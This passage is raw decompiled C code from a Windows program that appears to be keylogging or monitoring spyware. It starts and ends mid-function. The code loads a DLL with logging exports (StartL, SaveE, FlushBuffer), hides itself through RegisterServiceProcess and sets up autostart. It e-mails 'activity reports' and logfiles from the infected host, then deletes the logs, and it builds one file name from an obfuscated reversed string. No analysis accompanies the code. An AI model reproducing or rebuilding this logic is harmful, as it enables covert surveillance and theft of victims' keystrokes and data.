    function_4079c6((int32_t)&g57, (int32_t)&g57);
    int32_t * v42 = (int32_t *)(v1 + 24); // 0x40686c
    *(int32_t *)(v37 - 12) = *v42;
    *(int32_t *)(v37 - 16) = 5;
    function_4079c6((int32_t)&g57, (int32_t)&g57);
    *(int32_t *)(v37 - 20) = *v42;
    int32_t * v43 = (int32_t *)(v1 + 20); // 0x406882
    *(int32_t *)(v37 - 24) = *v43;
    function_4057a5((int32_t)&g57, (int32_t)&g57);
    *(int32_t *)(v37 - 28) = function_40585f();
    int32_t v44 = v37 - 32; // 0x406893
    *(int32_t *)v44 = 6;
    function_407a25((int32_t)&g57, (int32_t)&g57);
    *v41 = 0;
    int32_t * v45 = (int32_t *)(v37 - 36);
    int32_t * v46 = (int32_t *)(v37 - 40);
    int32_t v47 = 0; // 0x4068a7
    *v45 = 59;
    *v46 = g39;
    int32_t v48 = (int32_t)_mbschr((char *)&g57, (int32_t)&g57) + 1; // 0x4068b3
    int32_t v49 = v47; // 0x4068b5
    while (v48 != 0) {
        // 0x4068b7
        v47++;
        *v41 = v47;
        v49 = v47;
        if (*(char *)v48 == 0) {
            // break -> 0x4068c0
            break;
        }
        *v45 = 59;
        *v46 = v48;
        v48 = (int32_t)_mbschr((char *)&g57, (int32_t)&g57) + 1;
        v49 = v47;
    }
    // 0x4068c0
    *v45 = 4 * v49;
    int32_t v50 = _3f__3f_2_40_YAPAXI_40_Z((int32_t)&g57); // 0x4068c6
    *v43 = v50;
    int32_t v51 = v49; // 0x4068d9
    if (v49 >= 1) {
        // 0x4068db
        *v42 = v49;
        int32_t v52 = v50; // 0x4068db
        *v45 = 59;
        *v46 = g39;
        int32_t v53 = (int32_t)_mbschr((char *)&g57, (int32_t)&g57); // 0x4068e1
        *(int32_t *)(v37 - 44) = 260;
        int32_t v54 = _3f__3f_2_40_YAPAXI_40_Z((int32_t)&g57); // 0x4068ee
        int32_t * v55 = (int32_t *)v52; // 0x4068f5
        *v55 = v54;
        int32_t v56 = v53 - g39; // 0x4068f9
        *(int32_t *)(v37 - 48) = v56;
        *(int32_t *)(v37 - 52) = g39;
        *(int32_t *)(v37 - 56) = v54;
        function_40864a();
        *(char *)(*v55 + v56) = 0;
        int32_t v57 = *v42 - 1; // 0x406915
        *v42 = v57;
        int32_t v58 = v53 + 1; // 0x406918
        v52 += 4;
        while (v57 != 0) {
            // 0x4068de
            *v45 = 59;
            *v46 = v58;
            v53 = (int32_t)_mbschr((char *)&g57, (int32_t)&g57);
            *(int32_t *)(v37 - 44) = 260;
            v54 = _3f__3f_2_40_YAPAXI_40_Z((int32_t)&g57);
            v55 = (int32_t *)v52;
            *v55 = v54;
            v56 = v53 - v58;
            *(int32_t *)(v37 - 48) = v56;
            *(int32_t *)(v37 - 52) = v58;
            *(int32_t *)(v37 - 56) = v54;
            function_40864a();
            *(char *)(*v55 + v56) = 0;
            v57 = *v42 - 1;
            *v42 = v57;
            v58 = v53 + 1;
            v52 += 4;
        }
        // 0x40691a
        v51 = *v41;
    }
    // 0x40691d
    function_407c18();
    *v10 = 2;
    *v42 = 0;
    int32_t v59 = v44; // 0x406930
    if (v51 >= 1) {
        int32_t v60 = *v43; // 0x406932
        int32_t v61 = v44;
        *(int32_t *)(v61 - 4) = *(int32_t *)v60;
        *(int32_t *)(v61 - 8) = 0;
        function_4079c6((int32_t)&g57, (int32_t)&g57);
        *(int32_t *)(v61 - 12) = 1;
        int32_t v62 = v61 - 16; // 0x40694b
        *(int32_t *)v62 = v1 - 188;
        int32_t v63 = function_407c6e(); // 0x40694f
        *v41 = v63;
        while (v63 != 0) {
            uint32_t v64 = *v42 + 1; // 0x40695b
            *v42 = v64;
            v60 += 4;
            if (v64 >= v51) {
                // break -> 0x406966
                break;
            }
            v61 = v62;
            *(int32_t *)(v61 - 4) = *(int32_t *)v60;
            *(int32_t *)(v61 - 8) = 0;
            function_4079c6((int32_t)&g57, (int32_t)&g57);
            *(int32_t *)(v61 - 12) = 1;
            v62 = v61 - 16;
            *(int32_t *)v62 = v1 - 188;
            v63 = function_407c6e();
            *v41 = v63;
        }
        // 0x406966
        v59 = v62;
        if (v51 > 0) {
            int32_t v65 = *v43; // 0x40696d
            int32_t v66 = v51; // 0x40696d
            *(int32_t *)(v61 - 20) = *(int32_t *)v65;
            _3f__3f_3_40_YAXPAX_40_Z(&g57);
            v66--;
            v65 += 4;
            v59 = v62;
            while (v66 != 0) {
                // 0x40696f
                *(int32_t *)(v61 - 20) = *(int32_t *)v65;
                _3f__3f_3_40_YAXPAX_40_Z(&g57);
                v66--;
                v65 += 4;
                v59 = v62;
            }
        }
    }
    int32_t v67 = v59; // 0x406986
    if ((g31 & 96) == 96) {
        // 0x40698c
        v67 = v59 - 4;
        *(int32_t *)v67 = v33;
        DeleteFileA((char *)&g57);
    }
    int32_t v68 = v67; // 0x4069a0
    if (*v16 != 0) {
        int32_t v69 = v67 - 16; // 0x4069a5
        *v43 = v69;
        *(int32_t *)(v67 - 20) = 0;
        *(char *)v69 = *(char *)(v1 + 11);
        function_4047b7((int32_t)&g57);
        int32_t * v70 = (int32_t *)(v67 - 24); // 0x4069bd
        *v70 = v15;
        *v70 = strlen((char *)&g57);
        *(int32_t *)(v67 - 28) = v15;
        function_405027((int32_t)&g57);
        function_404618();
        v68 = v67 - 12;
    }
    // 0x4069db
    int32_t result; // 0x40668d
    int32_t v71; // 0x40668d
    int32_t v72; // 0x40668d
    if (*v42 != v51) {
        int32_t v73 = *v2;
        if ((g31 & 4) == 0) {
            // 0x406a60
            v71 = v68;
            if (v73 == 0) {
                goto lab_0x406aad;
            } else {
                int32_t v74 = v68 - 4; // 0x406a67
                int32_t * v75 = (int32_t *)v74; // 0x406a67
                *v75 = v73;
                *(int32_t *)(v68 - 8) = g40;
                if (function_404e11((int32_t)&g57, (int32_t)&g57) != 0) {
                    int32_t v76 = v68 - 16; // 0x406a80
                    *v2 = v76;
                    *(int32_t *)(v68 - 20) = 0;
                    *(char *)v76 = *(char *)(v1 + 11);
                    function_4047b7((int32_t)&g57);
                    int32_t * v77 = (int32_t *)(v68 - 24); // 0x406a95
                    *v77 = v73;
                    *v77 = strlen((char *)&g57);
                    *(int32_t *)(v68 - 28) = v73;
                    function_405027((int32_t)&g57);
                    function_404618();
                    v71 = v68 - 12;
                    goto lab_0x406aad;
                } else {
                    // 0x406a79
                    *v75 = (int32_t)"Unable to move contents to backupfile after sending e-mail";
                    v72 = v74;
                    goto lab_0x406a51;
                }
            }
        } else {
            // 0x406a0e
            v71 = v68;
            if (v73 == 0) {
                goto lab_0x406aad;
            } else {
                int32_t v78 = v68 - 16; // 0x406a1a
                *v42 = v78;
                *(int32_t *)(v68 - 20) = 0;
                *(char *)v78 = *(char *)(v1 + 11);
                function_4047b7((int32_t)&g57);
                int32_t * v79 = (int32_t *)(v68 - 24); // 0x406a2c
                *v79 = *v2;
                *v79 = strlen((char *)&g57);
                *(int32_t *)(v68 - 28) = *v2;
                function_405027((int32_t)&g57);
                v71 = v68 - 12;
                if (function_404618() != 0) {
                    goto lab_0x406aad;
                } else {
                    // 0x406a4c
                    *(int32_t *)v78 = (int32_t)"Unable to delete logfile after sending it by e-mail";
                    v72 = v78;
                    goto lab_0x406a51;
                }
            }
        }
    } else {
        // 0x4069e0
        result = 0;
        if (*(int32_t *)(v1 + 12) != 0) {
            // 0x4069e5
            *(int32_t *)(v68 - 4) = *v41;
            *(int32_t *)(v68 - 8) = function_4081ea((int32_t)&g57);
            *(int32_t *)(v68 - 12) = (int32_t)"MAILERROR";
            result = 0;
        }
        goto lab_0x406ab0;
    }
  lab_0x406ab0:
    // 0x406ab0
    *v10 = 1;
    _3f__3f_1_3f__24__Mpunct_40_D_40_std_40__40_MAE_40_XZ();
    *v10 = 0;
    ??1?$_Mpunct@D@std@@MAE@XZ6();
    *v9 = -1;
    ??1?$_Mpunct@D@std@@MAE@XZ4();
    // 0x406ad9
    __writefsdword(0, *(int32_t *)(v1 - 12));
    return result;
  lab_0x406aad:
    // 0x406aad
    *(int32_t *)(v71 - 4) = 1;
    result = 1;
    goto lab_0x406ab0;
  lab_0x406a51:
    // 0x406a51
    *(int32_t *)(v72 - 4) = (int32_t)"ERROR";
    v71 = v72 + 4;
    goto lab_0x406aad;
}

// Address range: 0x406ae8 - 0x406b97
int32_t function_406ae8(void) {
    // 0x406ae8
    function_408520((int32_t)&g57);
    int32_t v1; // 0x406ae8
    char * v2 = (char *)(v1 + 11); // 0x406af5
    int32_t v3 = *(int32_t *)(v1 + 8); // 0x406afa
    int32_t str = *(int32_t *)v3; // 0x406b00
    *(char *)(v1 - 44) = *v2;
    function_4047b7(0);
    strlen((char *)str);
    function_405027(str);
    int32_t str2 = *(int32_t *)(v3 + 4); // 0x406b22
    int32_t * v4 = (int32_t *)(v1 - 4); // 0x406b29
    *v4 = 0;
    *(char *)(v1 - 28) = *v2;
    function_4047b7(0);
    strlen((char *)str2);
    function_405027(str2);
    int32_t v5 = *(int32_t *)(v1 - 40); // 0x406b45
    int32_t v6 = *(int32_t *)(v1 - 24); // 0x406b53
    int32_t lpText = v6 == 0 ? (int32_t)&g2 : v6;
    char * lpCaption = v5 != 0 ? (char *)v5 : (char *)&g2; // 0x406b65
    MessageBoxA(NULL, (char *)lpText, lpCaption, *(int32_t *)(v3 + 8) | 0x10000);
    function_4047b7(1);
    *v4 = -1;
    function_4047b7(1);
    __writefsdword(0, *(int32_t *)(v1 - 12));
    return 0;
}

// Address range: 0x406b97 - 0x40730c
int32_t function_406b97(int32_t a1) {
    // 0x406b97
    function_408520((int32_t)&g57);
    int32_t v1; // bp-1776, 0x406b97
    int32_t v2; // 0x406b97
    *(int32_t *)(v2 - 16) = (int32_t)&v1;
    int32_t v3; // 0x406b97
    int32_t v4; // 0x406b97
    function_4058b2(v1, v3, v4);
    int32_t v5 = v2 - 220; // 0x406bb9
    char * v6 = NULL; // bp-1784, 0x406bbf
    char * v7 = (char *)v5; // bp-1788, 0x406bc0
    int32_t v8 = v2 - 4; // 0x406bc1
    int32_t * v9 = (int32_t *)v8; // 0x406bc1
    *v9 = 0;
    memset((int32_t *)v7, (int32_t)v6, 56);
    int32_t v10 = v2 - 96; // 0x406bc9
    int32_t v11 = v2 - 160; // 0x406bcc
    *(int32_t *)v11 = v10;
    int32_t v12 = v2 - 76; // 0x406bd2
    *(int32_t *)(v2 - 156) = v12;
    int32_t v13 = v2 - 68; // 0x406bdb
    *(int32_t *)(v2 - 152) = v13;
    int32_t v14 = v2 - 60; // 0x406be4
    *(int32_t *)(v2 - 148) = v14;
    int32_t v15 = v2 - 64; // 0x406bed
    *(int32_t *)(v2 - 144) = v15;
    int32_t v16 = v2 - 24; // 0x406bf6
    *(int32_t *)(v2 - 140) = v16;
    int32_t v17 = v2 - 72; // 0x406bff
    *(int32_t *)(v2 - 136) = v17;
    int32_t v18 = v2 - 56; // 0x406c08
    *(int32_t *)(v2 - 132) = v18;
    int32_t v19 = v2 - 1516; // 0x406c11
    function_4045eb(v19);
    int32_t v20 = v2 - 996; // 0x406c20
    char * lpBuffer = (char *)v20; // 0x406c2b
    v6 = lpBuffer;
    GetSystemDirectoryA(lpBuffer, 260);
    int32_t * v21 = (int32_t *)(v2 - 36); // 0x406c3b
    *v21 = 0;
    v7 = lpBuffer;
    int32_t * v22 = (int32_t *)(v2 - 32); // 0x406c46
    *v22 = 1;
    int32_t v23 = _mbsicmp((char *)v19, v7); // 0x406c49
    int32_t * v24 = (int32_t *)(v2 - 20); // 0x406c55
    *v24 = 0;
    char * v25 = (char *)v8; // 0x406c5a
    *v25 = 1;
    int32_t hObject = function_404562(0); // 0x406c5e
    int32_t v26 = (int32_t)&v6; // 0x406c63
    int32_t v27 = v26; // 0x406b97
    switch (hObject) {
        default: {
            // 0x406c6f
            v27 = v26;
            if (*(int32_t *)(v2 + 8) == 0) {
                // 0x406c74
                v7 = (char *)hObject;
                CloseHandle((int32_t *)hObject);
                if (v23 == 0) {
                    // 0x406c7f
                    exit(0);
                    // UNREACHABLE
                }
                // 0x406c85
                *v24 = 0x2000;
                v27 = (int32_t)&v7;
            }
        }
        case -1: {
        }
        case 0: {
            // 0x406c8c
            *(int32_t *)(v27 - 4) = v11;
            int32_t v28 = v27 - 8; // 0x406c9c
            *(int32_t *)v28 = v5;
            if (function_4058de((int32_t)&g57, (int32_t)&g57) == 0) {
                // 0x406ca6
                *(int32_t *)(v27 - 12) = 0;
                exit((int32_t)&g57);
                // UNREACHABLE
            }
            int32_t v29 = v2 - 188; // 0x406cac
            int32_t v30 = *(int32_t *)v29; // 0x406cac
            int32_t v31 = v30 & 1; // 0x406cb4
            g30 = v31;
            bool v32; // 0x406b97
            if (v31 != 0) {
                // 0x406cbe
                g31 = v30;
                g32 = *(int32_t *)(v2 - 176);
                g37 = *(int32_t *)v12;
                g39 = *(int32_t *)v14;
                g40 = *(int32_t *)v15;
                int32_t v33 = v2 - 204; // 0x406ce9
                g38 = *(int32_t *)v13;
                g33 = *(int32_t *)v33;
                int32_t v34 = v32 ? -4 : 4; // 0x406cf9
                int32_t v35 = v34 + (int32_t)&g33; // 0x406cf9
                int32_t v36 = v34 + v33; // 0x406cf9
                *(int32_t *)v35 = *(int32_t *)v36;
                int32_t v37 = v35 + v34; // 0x406cfa
                int32_t v38 = v36 + v34; // 0x406cfa
                *(int32_t *)v37 = *(int32_t *)v38;
                *(int32_t *)(v37 + v34) = *(int32_t *)(v38 + v34);
            }
            if (v23 != 0) {
                int32_t v39 = v28; // 0x406d0a
                if (*v24 == 0) {
                    // 0x406d0c
                    *(int32_t *)(v27 - 12) = v11;
                    v39 = v27 - 16;
                    *(int32_t *)v39 = v5;
                    *v24 = function_4059b1();
                }
                int32_t * v40 = (int32_t *)(v2 - 180); // 0x406d25
                int32_t v41 = v39; // 0x406d2b
                if (*v40 != 0) {
                    int32_t v42 = v2 - 88; // 0x406d30
                    *(int32_t *)v42 = *(int32_t *)v18;
                    *(int32_t *)(v2 - 84) = *(int32_t *)v17;
                    *(int32_t *)(v2 - 80) = *(int32_t *)(v2 - 172);
                    *(int32_t *)(v39 - 4) = v2 + 8;
                    *(int32_t *)(v39 - 8) = 0;
                    *(int32_t *)(v39 - 12) = v42;
                    *(int32_t *)(v39 - 16) = 0x406ae8;
                    *(int32_t *)(v39 - 20) = 0;
                    *(int32_t *)(v39 - 24) = 0;
                    int32_t * threadHandle = CreateThread((struct _SECURITY_ATTRIBUTES *)&g57, (int32_t)&g57, (int32_t (*)(int32_t *))&g57, &g57, (int32_t)&g57, &g57); // 0x406d52
                    v41 = v39 - 28;
                    *(int32_t *)v41 = 250;
                    *v21 = (int32_t)threadHandle;
                    Sleep((int32_t)&g57);
                }
                int32_t v43 = v41; // 0x406d6d
                if ((*(char *)v29 & 1) != 0) {
                    int32_t v44 = v2 - 348; // 0x406d73
                    int32_t * v45 = (int32_t *)(v41 - 4); // 0x406d79
                    *v45 = 32;
                    int32_t * v46 = (int32_t *)(v41 - 8); // 0x406d7b
                    *v46 = v44;
                    function_407598((int32_t)&g57, (int32_t)&g57);
                    int32_t v47 = v2 - 252; // 0x406d82
                    *v45 = 32;
                    *v46 = v47;
                    function_40756d((int32_t)&g57, (int32_t)&g57);
                    int32_t v48 = v2 - 52; // 0x406d92
                    *v45 = v48;
                    int32_t v49 = function_40731f((int32_t)&g57, (int32_t)&g57); // 0x406d97
                    int32_t v50 = *(int32_t *)(v49 + 4); // 0x406d9c
                    *v45 = v44;
                    *v46 = v47;
                    int32_t * v51 = (int32_t *)(v41 - 12); // 0x406db9
                    *v51 = v50 != 0 ? v50 : (int32_t)&g2;
                    int32_t v52 = v2 - 736; // 0x406dba
                    int32_t * v53 = (int32_t *)(v41 - 16); // 0x406dc0
                    *v53 = (int32_t)"Installation of %s on host %s (%s) ";
                    int32_t v54 = v41 - 20; // 0x406dc5
                    int32_t * v55 = (int32_t *)v54; // 0x406dc5
                    *v55 = v52;
                    sprintf((char *)&g57, (char *)&g57);
                    *v45 = 1;
                    function_4047b7((int32_t)&g57);
                    *v46 = *v24 == 0 ? (int32_t)"succeeded" : (int32_t)"failed";
                    *v51 = v52;
                    strcat((char *)&g57, (char *)&g57);
                    *(char *)(v2 - 92) = *(char *)(v2 + 11);
                    *v46 = 0;
                    function_4047b7((int32_t)&g57);
                    *v51 = 64;
                    int32_t v56 = v2 - 608; // 0x406e0c
                    *(char *)v56 = *(char *)&g29;
                    int32_t v57 = *v51; // 0x406e12
                    int32_t v58 = v2 - 607; // 0x406e15
                    __asm_rep_stosd_memset((char *)v58, 0, v57);
                    int32_t v59 = v57 * (v32 ? -4 : 4) + v58; // 0x406e1b
                    *v25 = 2;
                    *(int16_t *)v59 = 0;
                    *(char *)(v59 + (v32 ? -2 : 2)) = 0;
                    *v51 = v48;
                    int32_t v60 = function_40731f((int32_t)&g57, (int32_t)&g57);
                    int32_t v61 = *(int32_t *)(v60 + 4);
                    *v51 = v61 != 0 ? v61 : (int32_t)&g2;
                    int32_t v62; // 0x406b97
                    if (*v24 != 0) {
                        // 0x406e95
                        *v53 = (int32_t)"One or more errors where encountered while installing the %s engine:<br>\r\n<br>\r\n* ";
                        *v55 = v56;
                        sprintf((char *)&g57, (char *)&g57);
                        *v51 = 1;
                        function_4047b7((int32_t)&g57);
                        *v53 = v56;
                        *v53 = strlen((char *)&g57);
                        *v55 = v56;
                        function_405027((int32_t)&g57);
                        int32_t v63 = *v24; // 0x406ee4
                        int32_t v64 = v54; // 0x406eed
                        if ((v63 & 0x2000) != 0) {
                            // 0x406eef
                            v64 = v41 - 24;
                            int32_t * v65 = (int32_t *)v64; // 0x406ef2
                            *v65 = v48;
                            int32_t v66 = function_40731f((int32_t)&g57, (int32_t)&g57); // 0x406ef3
                            int32_t v67 = *(int32_t *)(v66 + 4); // 0x406ef8
                            *v65 = v67 != 0 ? v67 : (int32_t)&g2;
                            *(int32_t *)(v41 - 28) = (int32_t)"%s is already running on this host, installation aborted.";
                            *(int32_t *)(v41 - 32) = v56;
                            sprintf((char *)&g57, (char *)&g57);
                            *v65 = 1;
                            function_4047b7((int32_t)&g57);
                        }
                        int32_t v68 = v64; // 0x406f27
                        if ((v63 & 0x4000) != 0) {
                            // 0x406f29
                            v68 = v64 - 4;
                            int32_t * v69 = (int32_t *)v68; // 0x406f2c
                            *v69 = v48;
                            int32_t v70 = function_40731f((int32_t)&g57, (int32_t)&g57); // 0x406f2d
                            int32_t v71 = *(int32_t *)(v70 + 4); // 0x406f32
                            *v69 = v71 != 0 ? v71 : (int32_t)&g2;
                            *(int32_t *)(v64 - 8) = (int32_t)"Unable to create engine file. %s might be installed already";
                            *(int32_t *)(v64 - 12) = v56;
                            sprintf((char *)&g57, (char *)&g57);
                            *v69 = 1;
                            function_4047b7((int32_t)&g57);
                        }
                        int32_t v72 = v68; // 0x406f61
                        if ((int16_t)v63 <= 0xffff) {
                            // 0x406f63
                            v72 = v68 - 4;
                            int32_t * v73 = (int32_t *)v72; // 0x406f66
                            *v73 = v48;
                            int32_t v74 = function_40731f((int32_t)&g57, (int32_t)&g57); // 0x406f67
                            int32_t v75 = *(int32_t *)(v74 + 4); // 0x406f6c
                            *v73 = v75 != 0 ? v75 : (int32_t)&g2;
                            *(int32_t *)(v68 - 8) = (int32_t)"Unable to create link file. %s might be installed already";
                            *(int32_t *)(v68 - 12) = v56;
                            sprintf((char *)&g57, (char *)&g57);
                            *v73 = 1;
                            function_4047b7((int32_t)&g57);
                        }
                        int32_t v76 = v72; // 0x406f9b
                        if ((v63 & 0x10000) != 0) {
                            // 0x406f9d
                            v76 = v72 - 4;
                            int32_t * v77 = (int32_t *)v76; // 0x406fa0
                            *v77 = v48;
                            int32_t v78 = function_40731f((int32_t)&g57, (int32_t)&g57); // 0x406fa1
                            int32_t v79 = *(int32_t *)(v78 + 4); // 0x406fa6
                            *v77 = v63 & 4095;
                            *(int32_t *)(v72 - 8) = v79 != 0 ? v79 : (int32_t)&g2;
                            *(int32_t *)(v72 - 12) = (int32_t)"Enable autostartup failed. The %s engine will not be started automatically by Windows after a reboot (%u)";
                            *(int32_t *)(v72 - 16) = v56;
                            sprintf((char *)&g57, (char *)&g57);
                            *v77 = 1;
                            function_4047b7((int32_t)&g57);
                        }
                        int32_t v80 = v76; // 0x406fde
                        if ((v63 & 0x20000) != 0) {
                            // 0x406fe0
                            v80 = v76 - 4;
                            int32_t * v81 = (int32_t *)v80; // 0x406fe3
                            *v81 = v48;
                            int32_t v82 = function_40731f((int32_t)&g57, (int32_t)&g57); // 0x406fe4
                            int32_t v83 = *(int32_t *)(v82 + 4); // 0x406fe9
                            *v81 = v83 != 0 ? v83 : (int32_t)&g2;
                            *(int32_t *)(v76 - 8) = (int32_t)"Unable to start %s engine";
                            *(int32_t *)(v76 - 12) = v56;
                            sprintf((char *)&g57, (char *)&g57);
                            *v81 = 1;
                            function_4047b7((int32_t)&g57);
                        }
                        int32_t * v84 = (int32_t *)(v80 - 4); // 0x407018
                        *v84 = v56;
                        *v84 = strlen((char *)&g57);
                        int32_t v85 = v80 - 8; // 0x407026
                        *(int32_t *)v85 = v56;
                        function_4053c6((int32_t)&g57);
                        v62 = v85;
                    } else {
                        // 0x406e29
                        *v53 = (int32_t)g36;
                        *v55 = (int32_t)g35;
                        *(int32_t *)(v41 - 24) = (int32_t)g34;
                        *(int32_t *)(v41 - 28) = (int32_t)"<p>You will receive an activity report every %d days, %d hours and %d minutes from this host. Thank you for using %s!</p>";
                        *(int32_t *)(v41 - 32) = v56;
                        sprintf((char *)&g57, (char *)&g57);
                        *v51 = 1;
                        function_4047b7((int32_t)&g57);
                        *v53 = v56;
                        *v53 = strlen((char *)&g57);
                        *v55 = v56;
                        function_405027((int32_t)&g57);
                        v62 = v54;
                    }
                    int32_t v86 = *(int32_t *)(v2 - 88); // 0x40702f
                    v43 = v62 - 4;
                    int32_t * v87 = (int32_t *)v43; // 0x407038
                    *v87 = v86 != 0 ? v86 : (int32_t)&g2;
                    *(int32_t *)(v62 - 8) = v52;
                    *(int32_t *)(v62 - 12) = v52;
                    *(int32_t *)(v62 - 16) = 0;
                    *(int32_t *)(v62 - 20) = 0;
                    function_40668d();
                    *v25 = 1;
                    *v87 = 1;
                    function_4047b7((int32_t)&g57);
                }
                int32_t v88 = v43; // 0x407065
                if (*v40 != 0) {
                    // 0x407067
                    *(int32_t *)(v43 - 4) = -1;
                    *(int32_t *)(v43 - 8) = *v21;
                    WaitForSingleObject(&g57, (int32_t)&g57);
                    v88 = v43 - 12;
                    *(int32_t *)v88 = *v21;
                    CloseHandle(&g57);
                }
                int32_t v89 = v2 - 104; // 0x40707b
                *(int32_t *)v89 = -1;
                *(int32_t *)(v88 - 4) = (int32_t)&g13;
                *(int32_t *)(v88 - 8) = v89;
                _CxxThrowException(&g57, &g57);
                // UNREACHABLE
            }
            // break -> 0x40708d
            break;
        }
    }
    int32_t * v90 = (int32_t *)v16; // 0x40708d
    int32_t * v91 = (int32_t *)(v27 - 12); // 0x40708d
    *v91 = *v90;
    int32_t v92 = v2 - 1256; // 0x407090
    int32_t * v93 = (int32_t *)(v27 - 16); // 0x407096
    *v93 = v92;
    strcpy((char *)&g57, (char *)&g57);
    int32_t * v94 = (int32_t *)(v27 - 20); // 0x4070a2
    *v94 = v92;
    _mbsrev((char *)&g57);
    *v91 = v92;
    *v93 = v20;
    *v94 = (int32_t)"%s\\%s.dat";
    int32_t * v95 = (int32_t *)(v27 - 24); // 0x4070be
    *v95 = (int32_t)&g47;
    sprintf((char *)&g57, (char *)&g57);
    *v91 = v92;
    *v93 = v20;
    *v94 = (int32_t)"%s\\%s.le";
    *v95 = (int32_t)&g48;
    sprintf((char *)&g57, (char *)&g57);
    *v91 = *v90;
    *v93 = v20;
    int32_t v96 = v2 - 1776; // 0x4070f5
    *v94 = (int32_t)"%s\\%s.dll";
    *v95 = v96;
    sprintf((char *)&g57, (char *)&g57);
    *v91 = v96;
    int32_t * moduleHandle = LoadLibraryA((char *)&g57); // 0x407110
    int32_t v97 = (int32_t)moduleHandle; // 0x407110
    g46 = v97;
    if (moduleHandle == NULL) {
        int32_t v98 = v2 - 100; // 0x40711f
        *(int32_t *)v98 = -1;
        *v93 = (int32_t)&g13;
        *v94 = v98;
        _CxxThrowException(&g57, &g57);
        // UNREACHABLE
    }
    // 0x407131
    *v93 = (int32_t)"StopL";
    *v94 = v97;
    int32_t (*func)() = GetProcAddress(&g57, (char *)&g57); // 0x40713d
    *v95 = (int32_t)"StartL";
    g45 = (int32_t)func;
    *(int32_t *)(v27 - 28) = g46;
    int32_t (*func2)() = GetProcAddress(&g57, (char *)&g57); // 0x40714f
    *(int32_t *)(v27 - 32) = (int32_t)"SaveE";
    g44 = (int32_t)func2;
    *(int32_t *)(v27 - 36) = g46;
    int32_t (*func3)() = GetProcAddress(&g57, (char *)&g57); // 0x407161
    *(int32_t *)(v27 - 40) = (int32_t)"SetLOpt";
    g43 = (int32_t)func3;
    *(int32_t *)(v27 - 44) = g46;
    int32_t (*func4)() = GetProcAddress(&g57, (char *)&g57); // 0x407173
    *(int32_t *)(v27 - 48) = (int32_t)"FlushBuffer";
    g42 = (int32_t)func4;
    *(int32_t *)(v27 - 52) = g46;
    int32_t (*func5)() = GetProcAddress(&g57, (char *)&g57); // 0x407185
    g41 = (int32_t)func5;
    if (func5 == NULL || g45 == 0 || g44 == 0 || g43 == 0) {
        // 0x4072ee
        *(int32_t *)(v27 - 56) = g46;
        FreeLibrary(&g57);
        int32_t v99 = v2 - 108; // 0x4072fa
        *(int32_t *)v99 = -1;
        *(int32_t *)(v27 - 60) = (int32_t)&g13;
        *(int32_t *)(v27 - 64) = v99;
        _CxxThrowException(&g57, &g57);
        // UNREACHABLE
    }
    int32_t v100 = v27 - 56; // 0x4071ba
    *(int32_t *)v100 = (int32_t)"kernel32.dll";
    int32_t * moduleHandle2 = GetModuleHandleA((char *)&g57); // 0x4071bf
    int32_t v101 = v100; // 0x4071c9
    if (moduleHandle2 != NULL) {
        int32_t v102 = (int32_t)moduleHandle2; // 0x4071bf
        *(int32_t *)(v27 - 60) = (int32_t)"RegisterServiceProcess";
        int32_t v103 = v27 - 64; // 0x4071d0
        *(int32_t *)v103 = v102;
        int32_t (*func6)() = GetProcAddress(&g57, (char *)&g57); // 0x4071d1
        int32_t v104 = v103; // 0x4071d5
        if (func6 != NULL) {
            // 0x4071d7
            *(int32_t *)(v27 - 68) = 1;
            v104 = v27 - 72;
            *(int32_t *)v104 = 0;
        }
        // 0x4071dc
        v101 = v104 - 4;
        *(int32_t *)v101 = v102;
        FreeLibrary(&g57);
    }
    int32_t v105 = v2 - 284; // 0x4071e3
    int32_t * v106 = (int32_t *)(v101 - 4); // 0x4071e9
    *v106 = 32;
    int32_t * v107 = (int32_t *)(v101 - 8); // 0x4071eb
    *v107 = v105;
    function_407598((int32_t)&g57, (int32_t)&g57);
    int32_t v108 = v2 - 316; // 0x4071f2
    *v106 = 32;
    *v107 = v108;
    function_40756d((int32_t)&g57, (int32_t)&g57);
    *v106 = *(int32_t *)(v2 - 184);
    *v107 = (int32_t)&g47;
    *(int32_t *)(v2 - 124) = 0;
    int32_t v109 = v2 - 128; // 0x407227
    *(char *)v109 = *(char *)(v2 + 11);
    *(int32_t *)(v2 - 120) = 0;
    *(int32_t *)(v2 - 116) = 0;
    *v25 = 3;
    *v106 = v109;
    function_4073dd();
    *v106 = v109;
    *v107 = v108;
    int32_t * v110 = (int32_t *)(v101 - 12); // 0x40724f
    *v110 = v105;
    if (v105 != 0) {
        int32_t v111 = v2 - 112; // 0x40725d
        *(int32_t *)v111 = -1;
        *v106 = (int32_t)&g13;
        *v107 = v111;
        _CxxThrowException(&g57, &g57);
        // UNREACHABLE
    }
    // 0x40726f
    *v25 = 1;
    function_407387();
    *v106 = *(int32_t *)v10;
    _3f__3f_3_40_YAXPAX_40_Z(&g57);
    *v107 = *(int32_t *)v17;
    _3f__3f_3_40_YAXPAX_40_Z(&g57);
    *v110 = *(int32_t *)v18;
    _3f__3f_3_40_YAXPAX_40_Z(&g57);
    int32_t * v112 = (int32_t *)(v101 - 16); // 0x407293
    *v112 = *v90;
    _3f__3f_3_40_YAXPAX_40_Z(&g57);
    if (g30 == 0) {
        goto lab_0x4072ad;
    } else {
        // 0x4072a7
        if (*v22 != 0) {
            goto lab_0x4072d0;
        } else {
            goto lab_0x4072ad;
        }
    }
  lab_0x4072ad:
    // 0x4072ad
    *v106 = *(int32_t *)v12;
    _3f__3f_3_40_YAXPAX_40_Z(&g57);
    *v107 = *(int32_t *)v13;
    _3f__3f_3_40_YAXPAX_40_Z(&g57);
    *v110 = *(int32_t *)v14;
    _3f__3f_3_40_YAXPAX_40_Z(&g57);
    *v112 = *(int32_t *)v15;
    _3f__3f_3_40_YAXPAX_40_Z(&g57);
    goto lab_0x4072d0;
  lab_0x4072d0:
    // 0x4072d0
    *v9 = -1;
    ??1?$_Mpunct@D@std@@MAE@XZ5();
    __writefsdword(0, *(int32_t *)(v2 - 12));
    return *v22;
}

// Address range: 0x40730c - 0x40731f
int32_t function_40730c(void) {
    // 0x40730c
    int32_t v1; // 0x40730c
    if (*(int32_t *)(v1 - 164) == -1) {
        // 0x407315
        *(int32_t *)(v1 - 32) = 0;
    }
    // 0x407319
    return 0x40727b;
}

// Address range: 0x40731f - 0x407387
int32_t function_40731f(int32_t result, int32_t a2) {
    // 0x40731f
    char * str; // bp-20, 0x40731f
    int32_t v1 = (int32_t)&str; // 0x40732c
    str = (char *)0x4c2e4454;
    bool v2; // 0x40731f
    int32_t v3 = v2 ? -4 : 4; // 0x40732f
    int32_t v4 = v3 + v1; // 0x40732f
    int32_t v5 = v3 + (int32_t)"TD.LfzMph"; // 0x40732f
